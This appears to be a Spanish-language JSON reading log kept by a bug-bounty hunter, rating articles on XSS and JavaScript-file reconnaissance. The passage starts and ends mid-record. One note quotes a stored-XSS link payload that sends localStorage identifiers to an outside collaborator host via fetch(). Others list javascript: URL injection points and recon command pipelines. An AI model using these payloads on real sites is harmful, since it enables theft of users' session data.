console.log ( Number ( x));        // 123 console.log ( isNaN ( \" abc \" ));     // true",
      "editedTs": 1761527679176,
      "status": "excelente"
    },
    {
      "id": "0h3109f",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@zoningxtr/%EF%B8%8Fxss-prevention-101-why-using-value-keeps-your-javascript-secure-52d9e062ca13",
      "note": "en resumen usar .value lo trata como texto.\n\n C√≥digo en cuesti√≥n:\ndocumento . getElementById ( \"consulta\" ). valor = userInput;\nüß† Qu√© hace esto:\ndocument.getElementById(\"query\")\n‚Üí Selecciona el <input>elemento con id=\"query\".\n.value = userInput\n‚Üí Establece el valor del campo de entrada , de la siguiente manera:\n<input id=\"query\" value=\"userInput\">\nPero en lugar de generar c√≥digo HTML, lo hace de forma segura a trav√©s del DOM .\nüîê Por qu√© es seguro contra XSS:\nCuando se asigna una entrada de usuario a .value, JavaScript la trata como texto simple , no como c√≥digo .\n\n‚ú® Ejemplo:\nuserInput = ' < script > alerta ( \"XSS\" ) </ script > '; \ndocument.getElementById(\"consulta\").value = userInput;\nEl navegador no ejecutar√° el script.\nEn su lugar, el cuadro de entrada mostrar√° literalmente:\n\n< script > alerta ( \"XSS\" ) </ script >\nPorque .valuesimplemente coloca la cadena en el cuadro de entrada, no la interpreta ni la ejecuta como c√≥digo.\n\n‚ùå Alternativa insegura (solo para contrastar):\ndocumento . getElementById ( \"consulta\" ). internalHTML = entrada de usuario;\nSi userInput = '<script>alert(\"XSS\")</script>'esto sucede, se inyecta un script real que el navegador ejecuta .\n\n‚úÖ Resumen: ¬øPor qu√© .valuees seguro?\nUtiliza el DOM: interact√∫a con la estructura del elemento, no con la fuente HTML.\n\nSe trata como texto: El valor no se analiza como HTML ni JS.\nSin interpretaci√≥n: El navegador no ejecuta lo asignado a .value.",
      "editedTs": 1761527790501,
      "status": "buen"
    },
    {
      "id": "z7ipmtc",
      "title": "Protocolo js url donde usar",
      "payload": "https://medium.com/@zoningxtr/hidden-entrances-where-javascript-urls-are-still-allowed-a52842c6aee6",
      "note": "resumen, uso del protocolo javascrypt url en donde se puede utilizar.\n\n‚úÖ Lugares comunes que aceptan javascript:URL\n1. üß∑<a href=\"javascript:...\">\nEl ejemplo m√°s cl√°sico.\n< a  href = \"javascript:alert('XSS')\" > Haz clic en m√≠ </ a >\n2. üîò<area href=\"javascript:...\">\nSe utiliza dentro de <map>mapas de im√°genes.\n< nombre del mapa  = \"mi mapa\" > \n  < forma del √°rea  = \"rect\" coordenadas = \"34,44,270,350\" href = \"javascript:alert('XSS')\" alt = \"prueba\" >    \n</ mapa >\n3. üßæ<form action=\"javascript:...\">\nCuando se env√≠a el formulario, se ejecuta JS.\n< form  action = \"javascript:alert('XSS')\" > < \n  input type  = \"  submit \" value = \"Go\" > \n</form>\n4. üìå<iframe src=\"javascript:...\">\nGeneralmente est√° bloqueado en los navegadores modernos, pero anteriormente era explotable.\n< iframe  src = \"javascript:alert('XSS')\" > </ iframe >\n5. üé®<link href=\"javascript:...\">\nGeneralmente ya no funciona en los navegadores modernos debido a CSP y sandboxing, pero vale la pena mencionarlo para completarlo.\n6. üé¨<script src=\"javascript:...\">\nNo est√° permitido , pero esto es un error . Los navegadores javascript:lo rechazan src, aunque algunos navegadores antiguos podr√≠an analizarlo.\n7. ü™û M√©todos de la API DOM\nPuedes usar javascript:en JS para interacci√≥n din√°mica:\n\nventana.ubicaci√≥n = \"javascript:alerta('XSS')\" ; \nubicaci√≥n.href = \"javascript:alerta('XSS')\" ;\n‚ö†Ô∏è Contextos m√°s complicados que pueden usarse indirectamentejavascript:\n8. üîÅ Par√°metros de redirecci√≥n\nSi una aplicaci√≥n redirecciona en funci√≥n de una cadena de consulta, por ejemplo next=javascript:alert(1), y la inserta sin sanear en un href, puede generar un XSS.\n\n< a  href = \"{{ next }}\" > Haga clic en </ a >\nAporte:?next=javascript:alert(1)\n\n9. üß™ Marcadores\nLos usuarios pueden ingresar manualmente una javascript:URL en la barra de direcciones (como un marcador), aunque la mayor√≠a de los navegadores ahora bloquean esto a menos que sea un marcador.\n\njavascript: alerta (documento.cookie)\n10. üß± Inyecci√≥n de InnerHTML\nPuedes inyectar elementos con javascript:atributos a trav√©s de una manipulaci√≥n DOM vulnerable.\n\nelemento.innerHTML = '<a href=\"javascript:alert(1)\">Clic</a>' ;\n11. ‚öôÔ∏è url()Funciones CSS (‚ö†Ô∏è rara vez funcionan)\nAlgunos navegadores muy antiguos o con errores podr√≠an analizar url(\"javascript:...\")CSS.\n\ndiv { \n  imagen-de-fondo : url ( \"javascript:alert('XSS')\" ); \n}\n12. üì± Vistas web m√≥viles\njavascript:Es posible que las URL a√∫n funcionen en los navegadores integrados de las aplicaciones m√≥viles , donde los desarrolladores olvidaron deshabilitar o desinfectar los eventos de navegaci√≥n.\n\nüõ° C√≥mo se defienden los navegadores contra javascript:el ahora\nNavegadores modernos:\n\nBloqueo javascript:en muchos atributos ( src, hrefde enlaces de or√≠genes no confiables, etc.).\nHacer cumplir la pol√≠tica de seguridad de contenido (CSP) .\nDesinfecte o rechace la navegaci√≥n javascript:si no se escribe directamente.",
      "editedTs": 1761527963940,
      "status": "buen"
    },
    {
      "id": "mqxfbj7",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@zoningxtr/javascript-jump-start-series-4bf380051fac",
      "note": "1. ¬øQu√© es JavaScript?\nJavaScript es un lenguaje de scripting del lado del cliente que se ejecuta en el navegador . Se utiliza para a√±adir interactividad, como:\n\nVentanas emergentes\nDeslizadores\nValidaci√≥n de formulario\nActualizaciones de contenido en vivo\n¬°Juegos, animaciones y m√°s!\nüì¶ 2. C√≥mo usar JavaScript\nüî∏ Opci√≥n 1: En l√≠nea (no recomendado para scripts grandes)\n< button  onclick = \"alert('¬°Hola!')\" > Haz clic en m√≠ </ button >\nüî∏ Opci√≥n 2: En <script>Etiqueta\n<!DOCTYPE html > \n< html > \n< head > < title > Mi p√°gina JS </ title > </ head > \n< body > \n  < script > \n    alert(\"¬°Hola desde dentro de la etiqueta script!\"); \n  </ script > \n</ body > \n</ html >\nüî∏ Opci√≥n 3: Archivo externo (mejor pr√°ctica)\nCrear un script.js:\n\nconsole.log ( \"¬°Hola desde un archivo JS externo!\" );\nEnlazalo en HTML:\n\n< script  src = \"script.js\" > </ script >\n‚ú® 3. Sintaxis de JavaScript\n‚úÖ Variables\nlet name = \"John\" ;      // se puede cambiar \nconst age = 30 ;         // valor constante \nvar city = \"London\" ;    // forma antigua (no recomendada)\n‚úÖ Tipos de datos\nCadena\"Hello\"\n\nN√∫mero 123,3.14\n\nBooleano true,false\n\nresumen de que es js etc.\n\nFormaci√≥n[1, 2, 3]\n\nObjeto{name: \"John\", age: 30}\n\nNulonull\n\nIndefinidoundefined\n\nüß† 4. Funciones\nfunci√≥n  saludar ( nombre ) { \n  console.log ( \"Hola, \" + nombre); }\ngreet(\"Alice\"); // Salida: Hola, Alice\nüîÑ 5. Condicionales\nsea ‚Äã‚Äãedad = 20;\nsi (edad >= 18) { \n  console.log(\"Adulto\"); \n} de lo contrario { \n  console.log(\"Menor\"); \n}\nüîÅ 6. Bucles\nüîπ forbucle\npara ( sea i = 0 ; i < 5 ; i++) { console.log \n  ( \" N√∫mero: \" + i); }\nüîπ whilebucle\ndeje que count = 0 ; \nmientras (count < 3 ) { console.log \n  ( \" Count: \" + count);   count++; }\n\nüì¶ 7. Matrices\ndeje que frutas = [ \"Manzana\" , \"Pl√°tano\" , \"Mango\" ];\nconsole.log(fruits[0]); // Manzana \nfruits.push(\"Naranja\"); // A√±adir nuevo elemento\nüß± 8. Objetos\nlet usuario = { \n  nombre: \"Alice\" , \n  edad: 25, \n  ciudad: \"Par√≠s\"\n };\nconsole.log(usuario.nombre); // Alice\nüìû 9. Eventos\n< button  onclick = \"sayHi()\" > Haz clic en m√≠ </ button >\n<script> \n  funci√≥n sayHi() { \n    alert(\"¬°Hola!\"); \n  } \n</script>\nüîó 10. Manipulaci√≥n del DOM (P√°ginas web din√°micas)\n< p  id = \"mensaje\" > Hola </ p > \n< button  onclick = \"changeText()\" > Cambiar </ button >\n<script> \n  function changeText() { \n    document.getElementById(\"mensaje\").innerText = \"¬°Texto cambiado!\"; \n  } \n</script>\nüß™ 11. Consola\nUtilice esto en las herramientas de desarrollo de su navegador ( F12):\n\nconsole.log ( \"Esto se muestra en la consola\" ); console.error ( \"¬°Error!\" ) ; console.warn ( \" ¬°Advertencia ! \" ) ;",
      "editedTs": 1761528088458,
      "status": "buen"
    },
    {
      "id": "2n6k6rh",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/a-great-tool-that-will-be-helpful-in-your-bug-bounty-pentesting-journey-8ce118f4ea00",
      "note": "sitio web interesante tool. https://cyscan.io/",
      "editedTs": 1761528623119,
      "status": "buen"
    },
    {
      "id": "2i9xvwt",
      "title": "Nuevo informe",
      "payload": "https://osintteam.blog/finding-javascript-files-on-websites-using-automation-f8b8e03e3d66",
      "note": "nada interesante.",
      "editedTs": 1761528668135,
      "status": "monton"
    },
    {
      "id": "7iim2c7",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://cybersecuritywriteups.com/how-i-discovered-a-stored-xss-vulnerability-in-js-files-7b527d2c8962",
      "note": "nada interesante",
      "editedTs": 1761528744680,
      "status": "monton"
    },
    {
      "id": "js536yf",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@oXnoOneXo/how-i-got-a-stored-xss-by-searching-through-js-files-fdfe2490668b",
      "note": "sobre un xss almaceado que lo descubrio luego del analisis previo de un punto final en un js pero con httponly en las cookies etc en fin lo movio para xss blin exfiltracion de data de localstroage que contenia info delicada etc a su servidor.\n\n<a href=\"javascript:var match=JSON.stringify(localStorage).match(/ZNavIdentity\\.userId=[^&]+&currEntityId=[^&]+/);if(match)fetch('https://#collab.oastify/?cookie='+encodeURIComponent(match[0]))\">ttt</a>",
      "editedTs": 1761528990248,
      "status": "buen"
    },
    {
      "id": "wgzej4y",
      "title": "Nuevo informe",
      "payload": "https://bitpanic.medium.com/finding-exposed-sensitive-api-keys-in-js-files-5c129fb1f2c7",
      "note": "nada nuevo.",
      "editedTs": 1761529041427,
      "status": "monton"
    },
    {
      "id": "7ti9re3",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/easy-way-to-find-exposed-sensitive-api-keys-in-js-files-d9f9fccb18bb",
      "note": "nada nuevo.",
      "editedTs": 1761529100950,
      "status": "monton"
    },
    {
      "id": "zfrq9jm",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/finding-an-api-key-in-a-js-file-in-the-comments-67b30af1d451",
      "note": "Estoy usando una extensi√≥n de Firefox llamadaEmbellecer javascript\n\nEmbellece el c√≥digo cuando visitas un archivo .js.",
      "editedTs": 1761529195407,
      "status": "buen"
    },
    {
      "id": "m5pswui",
      "title": "Nuevo informe",
      "payload": "https://hackersatty.medium.com/1000-bug-bounty-guide-uncovering-hidden-vulnerabilities-through-javascript-analysis-c3f1a698b91b",
      "note": "nada interesante.",
      "editedTs": 1761529244984,
      "status": "monton"
    },
    {
      "id": "n6leayi",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/h7w/how-to-find-xss-vulnerabilities-in-react-js-websites-46f843bb932e",
      "note": "Uno de los primeros pasos para detectar vulnerabilidades XSS es revisar el c√≥digo para detectar cualquier caso en el que la entrada del usuario se renderice directamente en el DOM. En React, esto suele ocurrir al usar la dangerouslySetInnerHTMLpropiedad. Si bien esta funci√≥n puede ser √∫til para renderizar contenido HTML, tambi√©n puede suponer importantes riesgos de seguridad si no se gestiona correctamente. A continuaci√≥n, se muestra un ejemplo de c√≥mo se puede usar incorrectamente esta propiedad:\n\nCopiar\nconst UserComment = ({ comment }) => {\n  return <div dangerouslySetInnerHTML={{ __html: comment }} />;\n};\nEn este ejemplo, si la commentpropiedad contiene scripts maliciosos, se ejecutar√°n en el navegador del usuario. Para mitigar este riesgo, depure siempre la entrada del usuario antes de renderizarla. Bibliotecas como DOMPurifypueden ayudarle a depurar contenido HTML de forma segura. As√≠ es como puede implementarlo:\n\nCopiar\nimport DOMPurify from 'dompurify';\n\nconst UserComment = ({ comment }) => {\n  const cleanComment = DOMPurify.sanitize(comment);\n  return <div dangerouslySetInnerHTML={{ __html: cleanComment }} />;\n};\nOtra √°rea com√∫n para buscar vulnerabilidades XSS son los formularios que aceptan comentarios de los usuarios. Aseg√∫rese de validar y depurar todos los campos de entrada. Por ejemplo, si tiene un formulario que acepta comentarios de los usuarios, debe validar la entrada para asegurarse de que no contenga scripts da√±inos. A continuaci√≥n, se muestra un ejemplo sencillo de c√≥mo gestionar el env√≠o de formularios de forma segura:\n\nCopiar\nconst handleSubmit = (event) => {\n  event.preventDefault();\n  const userInput = event.target.elements.comment.value;\n  const cleanInput = DOMPurify.sanitize(userInput);\n  // Proceed to submit cleanInput to your server\n};\nAdem√°s de las revisiones de c√≥digo, el uso de herramientas automatizadas puede ser de gran ayuda para identificar vulnerabilidades XSS. Herramientas como OWASP ZAP y Burp Suite pueden analizar su aplicaci√≥n en busca de problemas de seguridad comunes, incluyendo XSS. Estas herramientas simulan ataques a su aplicaci√≥n y generan informes detallados sobre posibles vulnerabilidades. Ejecutar estos an√°lisis regularmente durante el proceso de desarrollo puede ayudar a detectar problemas de forma temprana.\n\nAdem√°s, considere implementar encabezados de Pol√≠tica de Seguridad de Contenido (CSP) en su aplicaci√≥n. La CSP es una funci√≥n de seguridad que ayuda a prevenir ataques XSS al especificar qu√© fuentes de contenido son confiables. Al definir una CSP estricta, puede limitar la ejecuci√≥n de scripts solo a aquellos que haya permitido expl√≠citamente. A continuaci√≥n, se muestra un ejemplo de c√≥mo configurar un encabezado CSP b√°sico en la configuraci√≥n de su servidor:\n\nCopiar\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted-scripts.com;\nEste encabezado le indica al navegador que solo ejecute scripts del mismo origen y desde trusted-scripts.com, lo que reduce efectivamente el riesgo de ataques XSS.\n\nPor √∫ltimo, es fundamental mantenerse informado sobre las √∫ltimas pr√°cticas y vulnerabilidades de seguridad.\nConsulta regularmente las actualizaciones de la comunidad de React y sigue las mejores pr√°cticas para una programaci√≥n segura. Participar en foros y recursos centrados en la seguridad puede proporcionarte informaci√≥n valiosa y mantenerte al d√≠a sobre las amenazas emergentes.\n\nIdentificar y mitigar vulnerabilidades XSS en aplicaciones React JS es un proceso continuo que requiere diligencia y medidas proactivas. Al revisar su c√≥digo, depurar la entrada de los usuarios, utilizar herramientas automatizadas, implementar CSP y mantenerse informado, puede mejorar significativamente la seguridad de sus aplicaciones web. Recuerde que una aplicaci√≥n segura no solo protege a sus usuarios, sino que tambi√©n genera confianza y credibilidad en su marca.",
      "editedTs": 1761529377921,
      "status": "buen"
    },
    {
      "id": "dvrtej9",
      "title": "Nuevo informe",
      "payload": "https://systemweakness.com/advanced-techniques-for-identifying-leaked-api-keys-in-js-files-bb67845e5c0e",
      "note": "nada interesante.",
      "editedTs": 1761529484634,
      "status": "monton"
    },
    {
      "id": "t6wgk8a",
      "title": "embeller desofuscar js",
      "payload": "https://freedium.cfd/https://systemweakness.com/ever-found-a-valid-bug-leaks-in-javascript-files-part-1-efe1f535983b",
      "note": "Herramientas de desofuscaci√≥n :\n\nJSNice : una herramienta en l√≠nea que embellece y desofusca el c√≥digo JavaScript, haci√©ndolo m√°s legible.\nBeautify.js : un embellecedor de JavaScript que formatea el c√≥digo minimizado para facilitar su an√°lisis.\n\n Desofuscar el c√≥digo\nEl embellecimiento mejora la legibilidad, pero no soluciona la ofuscaci√≥n, donde los nombres de variables y funciones se ocultan intencionalmente. Herramientas como JSNice pueden ayudar a desofuscar este tipo de c√≥digo al predecir nombres m√°s significativos.\n\nUsando JSNice a trav√©s de la l√≠nea de comandos :\nAunque JSNice ofrece una interfaz web, tambi√©n puedes usarla program√°ticamente. Aqu√≠ te explicamos c√≥mo hacerlo curl:\nCopiar\ncurl -X POST -s --data-binary @beautified_script.js \"http://jsnice.org/beautify?pretty=1&rename=1&types=1\" -o deobfuscated_script.js\nEste comando env√≠a a beautified_script.jsJSNice para su procesamiento y guarda el c√≥digo desofuscado como deobfuscated_script.js.\n\nBanderas :\n\npretty=1:Garantiza que la salida est√© formateada (embellecida).\nrename=1:Permite cambiar el nombre de las variables a nombres m√°s significativos.\ntypes=1:Intenta inferir y anotar tipos de variables.",
      "editedTs": 1761529684081,
      "status": "excelente"
    },
    {
      "id": "yjsgbhx",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://systemweakness.com/javascript-for-hackers-a-full-tutorial-84a2be091427",
      "note": "resumen de que se puede hacer y enconcontrar en js poco basico pero esta bien.\n\nTabla de contenido:\nComprender JavaScript en el contexto de la seguridad\nConfiguraci√≥n de su entorno\nJavaScript b√°sico para hackers\nEscribiendo tu primer gui√≥n\nUsando la consola\n4. Explotaci√≥n de XSS (Cross-Site Scripting)\n\n¬øQu√© es XSS?\nEjemplo de ataque XSS\nEvitar filtros\n5. Manipulaci√≥n del DOM para pruebas de seguridad\n\nInteractuar con el DOM (Modelo de objetos de documento)\nExplotaci√≥n de JavaScript inseguro en sitios web\n6. Phishing con JavaScript\n\nCreaci√≥n de formularios de inicio de sesi√≥n falsos\nRecopilaci√≥n de la entrada del usuario\n7. JavaScript para el raspado y reconocimiento web\n\nUso de JavaScript para automatizar la recopilaci√≥n de datos\n8. JavaScript en ataques de red\n\nEnv√≠o de solicitudes HTTP desde el navegador\n9. Vulnerabilidades comunes de JavaScript\n\nInseguroeval()\nDeserializaci√≥n insegura\n10. JavaScript avanzado: Explotaci√≥n del c√≥digo del lado del servidor\n\nExploits de Node.js\nExplotaci√≥n de API inseguras",
      "editedTs": 1761530231204,
      "status": "regular"
    },
    {
      "id": "ndviijy",
      "title": "Nuevo informe",
      "payload": "https://hackersatty.medium.com/500-secrets-uncovering-critical-vulnerabilities-with-advanced-javascript-analysis-ab9a970dc8e8",
      "note": "nada interesante.",
      "editedTs": 1761530420252,
      "status": "monton"
    },
    {
      "id": "090r1t5",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/h7w/mastering-javascript-can-it-make-you-an-xss-bug-hunter-a0f0aaba0c6f",
      "note": "pues solo explica por arriba un poco si dominas algo de js y como sanitiza los diferentes fremor etc pero nada de otro mundo.",
      "editedTs": 1761530563853,
      "status": "regular"
    },
    {
      "id": "jhg5yoa",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@0xbugatti/js-review-and-abuse-graphql-result-10xbac-admin-panel-ato-0f013fe471ea",
      "note": "impresionante encontro un panel logyn aparentemente sin ningun camino y resulto que estaba construido con react y node.js y analizo un poco los archivos js en busqueda palabras claves etc y encontro login un logica probo mutaciones y operaciones necesarias en GraphQL cambio admin administrador y entro etc tenia disponible todos los metodos http get pos delet upgrade etc .",
      "editedTs": 1761530887178,
      "status": "muybueno"
    },
    {
      "id": "608a728",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@ahmed.elshaepe/all-about-javascript-analysis-for-bug-bounty-hunting-3e0f941c9676",
      "note": "Nada nuevo, lo unico es la tool para sacar los archivos .js de cada sub-domain https://github.com/003random/getJS problema que veo a hacerlo con esta tool,  te estarias limitando mucho me refiero que estarias dejando de lado tool como waybacurls que son super potente y ademas se dipersa mucho el enfoque mejor ir por cada subdomain, y aplicar la metodologia completa a cada archivo .js de cada sub-domain asi confirmas y completas de manera correcta el analisis completa y detallado.Unico interesante seria la opcion de Nucley para sacar mas info de .js : nuclei -l js.txt -t ~/nuclei-templates/exposures/",
      "editedTs": 1761552281039,
      "status": "regular"
    },
    {
      "id": "1dqd87j",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@marduk.i.am/recon-methodology-javascript-file-hunting-254127ecd211",
      "note": "Interesante, katana -list subdomains_alive.txt -d 2 -jc -silent | grep -E '\\.js([?#].*)?$' | sort -u > live_katana_js.txt\n comando de katana opcion para extraer .js \notro comando para linkfinder -i https://www.example.com -d -o cli | sort -u | tee linkfinder_raw.txt\ny luego La salida sin procesar contiene una mezcla de URL completas y puntos finales incompletos. Para limpiarla:\n# Extract only URLs for our target domain\ngrep -Eo 'https?://[^ )\"]+example\\.com[^ )\"]*' linkfinder_raw.txt | sort -u > linkfinder_urls.txt\n\n# Filter URLs that point to JS files\ngrep -E '\\.js([?#].*)?$' linkfinder_urls.txt | sort -u > live_linkfinder_js.txt\n\n\n\nEsto extrae URLs de fuentes como Wayback Machine, CommonCrawl y URLScan. El indicador ‚Äîsubs garantiza que tambi√©n obtengamos URLs de subdominios.\n\nNOTA : Al extraer datos de los archivos, utilice la lista de todos los subdominios de su dominio de destino. No solo los que siguen activos.\n\n\ngau --subs < subdomains.txt | grep -E '\\.js([?#].*)?$' | sort -u > archive_gau_js.txt\n\n\n\nUn buscador de URL de Wayback Machine m√°s simple y dedicado del gran Tomnomnom.\n\n\nwaybackurls < subdomains.txt | grep -E '\\.js([?#].*)?$' | sort -u > archive_wayback_js.txt\n\n\n\n\nUna vez que tengamos estas URL hist√≥ricas, podemos ejecutar subjs o getjs en ellas, igual que hicimos con las URL activas. Esta es una excelente manera de capturar referencias JS que solo se enlazaron desde las p√°ginas antiguas.\n\n\ncat archive_gau_js.txt archive_wayback_js.txt | subjs | sort -u > archive_subjs_js.txt\ncat archive_gau_js.txt archive_wayback_js.txt | getJS | sort -u > archive_getjs_js.txt\n\n: No todos los archivos JS archivados ser√°n accesibles (algunos pueden devolver 404 o 403), pero incluso las respuestas que no sean 200 a veces se pueden descargar directamente desde archive.org si encuentra la URL de la instant√°nea archivada.\n\n\nNo queremos analizar cada archivo por separado ni tener duplicados flotando, as√≠ que combinemos todo en una lista limpia.\n\nsort -u live_*js.txt archive_*js.txt > all_js_files.txt\n\n\n\nOpcional: Extraiga archivos JS para analizarlos sin conexi√≥n\nDescargar todos los archivos JS permite realizar an√°lisis est√°ticos sin depender de servidores activos. Es un proceso un poco m√°s complejo, pero sencillo.\n\nCrear carpeta:\nCrea una carpeta para todos los archivos JS.\n\nCopiar\n# -p ensures it won't error if the folder already exists\nmkdir -p js_files\n2. Descargue los archivos en su carpeta con nombres de archivo codificados\n\nAlmacenaremos dos cosas:\n\nUn nombre de archivo en hash para cada archivo JS (evita sobrescribir cuando varios archivos comparten el mismo nombre, como app.js).\nUn archivo de mapeo para que puedas rastrear cada hash hasta su URL original.\nCopiar\n# Clear the hash_map.txt\n> js_files/hash_map.txt\n\n# One containing hashed filenames, and another containing the hash-to-URL mapping.\nwhile read -r url; do\n    hash=$(echo \"$url\" | md5sum | cut -d' ' -f1)\n    echo \"$hash $url\" >> js_files/hash_map.txt\n    curl -skLf --compressed \"$url\" -o \"js_files/${hash}.js\"\ndone < all_js_files.txt\nAhora, si encuentra algo interesante en un archivo ( por ejemplo, d41d8cd98f.js ), puede rastrearlo r√°pidamente:\n\nCopiar\ngrep d41d8cd98f js_files/hash_map.txt\nResumen\nCopiar\n# 1. JS from live hosts\ncat subdomains_alive.txt | subjs | sort -u > live_subjs_js.txt\ncat subdomains_alive.txt | getJS | sort -u > live_getjs_js.txt\nkatana -list subdomains_alive.txt -d 2 -jc -silent | grep -E '\\.js([?#].*)?$' | sort -u > live_katana_js.txt\n\nlinkfinder -i https://www.example.com -d -o cli | sort -u | tee linkfinder_raw.txt\ngrep -Eo 'https?://[^ )\"]+example\\.com[^ )\"]*' linkfinder_raw.txt | sort -u > linkfinder_urls.txt\ngrep -E '\\.js([?#].*)?$' linkfinder_urls.txt | sort -u > live_linkfinder_js.txt\n\n# 2. JS from archived URLs\ngau --subs < subdomains.txt | grep -E '\\.js([?#].*)?$' | sort -u > archive_gau_js.txt\nwaybackurls < subdomains.txt | grep -E '\\.js([?#].*)?$' | sort -u > archive_wayback_js.txt\ncat archive_gau_js.txt archive_wayback_js.txt | subjs | sort -u > archive_subjs_js.txt\ncat archive_gau_js.txt archive_wayback_js.txt | getJS | sort -u > archive_getjs_js.txt\n\n# 3. Merge & deduplicate\nsort -u live_*js.txt archive_*js.txt > all_js_files.txt\n\n# Optional: Filter by target domain\ngrep -E '\\.example\\.com' all_js_files.txt > all_js_example.txt\n\n# 4. Optional: Pull down the JS for offline static analysis\nmkdir -p js_files\n> js_files/hash_map.txt\nwhile read -r url; do\n    hash=$(echo \"$url\" | md5sum | cut -d' ' -f1)\n    echo \"$hash $url\" >> js_files/hash_map.txt\n    curl -skLf --compressed \"$url\" -o \"js_files/${hash}.js\"\ndone < all_js_files.txt",
      "editedTs": 1761552311944,
      "status": "buen"
    },
    {
      "id": "34c91wa",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://blog.stackademic.com/hunting-javascript-file-for-bug-hunters-e8b278a1306a",
      "note": "esta bueno intersante, muestra como configurar tu burp para interceptar los archivos .js filtrar en la parte de configuracion ademas 2 repos \nhttps://github.com/l4yton/RegHex?source=post_page-----c95a8aa7037a-------------------------------- este repo contiene un aproxmiado de 50 reglas regex interesante para sumar al arsenal de busqueda con reglas regex otro repo es para poder probar esas pia keys token etc con https://github.com/streaak/keyhacks\n\n\nhttps://github.com/KathanP19/JSFScan.sh?tab=readme-ov-file tool interesante formato web resultado",
      "editedTs": 1761552335721,
      "status": "regular"
    },
    {
      "id": "rwb2fnm",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://hackersatty.medium.com/1000-bug-bounty-guide-uncovering-hidden-vulnerabilities-through-javascript-analysis-c3f1a698b91b",
      "note": "nada interesante algunas reglas regex nada de otro mundo.",
      "editedTs": 1761552362385,
      "status": "monton"
    },
    {
      "id": "nfpj2ll",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/meetcyber/javascript-recon-for-bug-bounty-pentesting-3b22617007ec",
      "note": "nada interesante.",
      "editedTs": 1761552379884,
      "status": "monton"
    },
    {
      "id": "cmpmpk5",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/i-found-127-hidden-bugs-in-javascript-files-heres-how-544f6f57346c",
      "note": "nada nuevo 127 bugs encontrado pero bueno nada util.",
      "editedTs": 1761552401924,
      "status": "monton"
    },
    {
      "id": "nib9y60",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@owtrain/js-file-enumeration-for-bug-bounty-8d3cce217f32",
      "note": "nada.",
      "editedTs": 1761552426922,
      "status": "monton"
    },
    {
      "id": "ofbr01u",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://osintteam.blog/how-to-identify-sensitive-data-in-javascript-files-jsrecon-306b8a2e6462",
      "note": "nada nuevo.",
      "editedTs": 1761552446029,
      "status": "monton"
    },
    {
      "id": "4b3jbs7",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://bensaad0.medium.com/unveiling-hidden-treasures-how-analyzing-javascript-files-led-me-to-tokens-and-secret-keys-84160866baf9",
      "note": "nada nuevo.",
      "editedTs": 1761552471271,
      "status": "monton"
    },
    {
      "id": "zlvrfah",
      "title": "Nuevo informe",
      "payload": "https://osintteam.blog/how-to-identify-sensitive-data-in-javascript-files-jsrecon-306b8a2e6462",
      "note": "Extraer par√°metros LFI\n\n\ncat all_urls.txt | grep -E \"file=|path=|doc=|include=\" | tee lfi_params.txt",
      "editedTs": 1761552488160,
      "status": "buen"
    },
    {
      "id": "k4p06wa",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/exploring-sensitive-data-in-javascript-files-606447e6a5cd",
      "note": "nada",
      "editedTs": 1761552503597,
      "status": "monton"
    },
    {
      "id": "kd6vawo",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/how-i-found-100-api-keys-in-javascript-files-js-secrets-exposed-939cc1f22289",
      "note": "nada",
      "editedTs": 1761552525626,
      "status": "monton"
    },
    {
      "id": "3thxdzi",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@hrofficial62/by-using-javascript-analysis-got-200-for-just-an-api-token-leak-information-disclosure-a2f1868ab94f",
      "note": "nada",
      "editedTs": 1761552558690,
      "status": "monton"
    },
    {
      "id": "jlqu7ii",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@trapp3rhat/bug-hunting-methodology-part-1-91295b2d2066",
      "note": "nada",
      "editedTs": 1761552570790,
      "status": "monton"
    },
    {
      "id": "ja51nwt",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://l0da.medium.com/how-i-hacked-one-of-these-big-companies-js-files-analysis-7cf47372b642",
      "note": "nada",
      "editedTs": 1761552586127,
      "status": "monton"
    },
    {
      "id": "lqrepcb",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@mrflash403/static-js-analysis-1383a7bf22c7",
      "note": "nada",
      "editedTs": 1761552603449,
      "status": "monton"
    },
    {
      "id": "dl2sl6r",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@hrofficial62/analyzing-javascript-files-to-find-bugs-7b277d1df435",
      "note": "nada",
      "editedTs": 1761552615127,
      "status": "monton"
    },
    {
      "id": "75xnl5o",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/weird-javascript-files-7e6e7296e914",
      "note": "nada",
      "editedTs": 1761552627666,
      "status": "monton"
    },
    {
      "id": "n5xrs7u",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/bug-bounty-tips-tricks-js-javascript-files-bdde412ea49d",
      "note": "nada",
      "editedTs": 1761552642869,
      "status": "monton"
    },
    {
      "id": "kpie4zd",
      "title": "Nuevo informe",
